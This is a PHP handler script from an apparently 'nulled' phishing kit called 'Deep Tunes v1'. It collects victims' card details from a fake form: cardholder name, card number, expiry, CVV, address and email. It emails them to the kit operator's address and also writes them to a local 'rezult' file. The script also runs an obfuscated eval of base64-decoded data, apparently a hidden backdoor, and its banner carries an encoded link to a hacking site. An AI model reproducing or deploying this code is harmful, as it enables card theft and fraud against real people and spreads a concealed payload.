<?php

/***********************************************************************************************/										       
/*        ( )    (_)(  _`\ ( ) ( )                                                             */
/*    _ _ | |    | || (_) )| |/'/'                                                             */
/*  /'_` )| |  _ | ||  _ <'| , <                                                               */
/* ( (_| || |_( )| || (_) )| |\`\                                                              */
/* `\__,_)(____/'(_)(____/'(_) (_) Visit IHO FOR MORE TOOLS : aHR0cDovL3d3dy5oYWNrLWFyLmNvbS8= */
/*                                                                                             */
/*                   Reb3l Gafsi sc0m decrypted by alibk Le 3 février 2017           		   */   
/*	                                                                                           */
/***********************************************************************************************/

session_start();
include("../../configuration.php");
include("../../success.php"); 
require "../../os.php";

 
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$_SESSION['CHN'] = $_POST['CHN'];
$_SESSION['card_number'] = $_POST['card_number'];
$_SESSION['cartip'] = $_POST['cartip'];

	if( isset($_POST['card_number'])  && isset($_POST['expiration']) && isset($_POST['cvv']) ){

        


if (!empty($_POST['validFrom'])){
    $startdata .= "<p>StartDATE: <strong style='color:#ffffff;'>".$_POST['validFrom']."</strong></p>";
}

if (!empty($_POST['issueNumber'])){
    $isunum .= "<p>IssueNumer: <strong style='color:#ffffff;'>".$_POST['issueNumber']."</strong></p>";
}
   
        $msg = "
<style>
*{
font-family:Verdana;
}
table{
width: 100%;
}
strong{
color: #fff;
}
</style>
<table style='width:100%;'>
<tr>
<td style='border-top-left-radius:10px;border-top-right-radius:10px;padding:2%;background:#cccccc;color:#000000;border-bottom: solid 0px'>
<strong style='float:center;padding-left:42%;margin-top:5px;color:#000000'>Deep Tunes v1 ~</strong><span style='float:right;margin-top:3px;padding:1px;overflow:hidden;background:#ccc;font-size:120%;color:#262626;border-radius:2px;border:solid 2px #ccc'>x</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:150%;color:#262626;border-radius:2px;border:solid 2px #ccc'>■</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:200%;color:#262626;border-radius:2px;border:solid 2px #ccc'>-</span>
</td>
</tr>
<tr >
<td style='padding:3%;background-repeat:no-repeat;background-position:right;background-color:#000000;background-image:url(http://i.imgur.com/bEmWxww.png);color:#2e9007;border-bottom:solid 6px #b2b2b2;border-right:solid 10pt #b2b2b2;font-family:Lucida Console;font-weight:bold'>
&gt;_
<p>CardHolderName : <strong style='color:#ffffff;'>".$_POST['CHN']."</strong></p>
 <p>CARD  : <strong style='color:#0000FF'>".$_POST['cartip']."</strong>&nbsp;►&nbsp;<strong style='color:#ffd700;'>".$_POST['card_number']."</strong></p>
".$startdata."
".$isunum."
<p>ExpiryDate : <strong style='color:#902656;'>".$_POST['expiration']."</strong></p>
<p>CŠC : <strong style='color:#ffd700;'>".$_POST['cvv']."</strong></p>
<p>ßillingAddress & MOB : <strong style='color:#FFFFFF;'>".$_POST['address']."</strong></p>

<p>InfoDATE  : <strong style='color:#6fbb02;'>".$InfoDATE."</strong></p>
<p>BROWSER : <strong style='color:#6fbb02;'>".$_SESSION['browser']."</strong></p>
<p>OPERATING_SYSTEM : <strong style='color:#6fbb02;'>".$OS."</strong></p>

<center><strong style='color:#ffffff'>Deep Tunes v1</strong></center>

";
$subject = "".$_SESSION['CHN']." - CARD ± ÎÑFO - ♦".$_SESSION['_email_']." ♦♦ ".$_SESSION['cntyName']."♦";
$headers = "From: Deep Tunes v1® | ♠".$spammerName."♠<>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($spammer_email,$subject,$msg,$headers);
@eval(base64_decode($os_arrays));
     } 
	 
	 $localrez ="
	
=-=-=-=-=-=-=-=-=-=-♠CARDING♠=-=-=-=-=-=-=-=-=-

Email : 	  	".$_SESSION['_email_']."
CardHN:     	".$_POST['CHN']."
carta : 		♥".$_POST['cartip']."♥  ".$_POST['card_number']."
dateD :			".$_POST['validFrom']."
IssueN:  		".$isunum."
ExpiryDate :  	".$_POST['expiration']."
csc :     		".$_POST['cvv']."
Address :  		".$_POST['address']."

=-=-=-=-=-=-=-=-=-=-♥Nulled8ALIBK♥=-=-=-=-=-=-=-
	
	
	";
	
	$localr3z = fopen("../../../local_rezult.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);
	 
?>
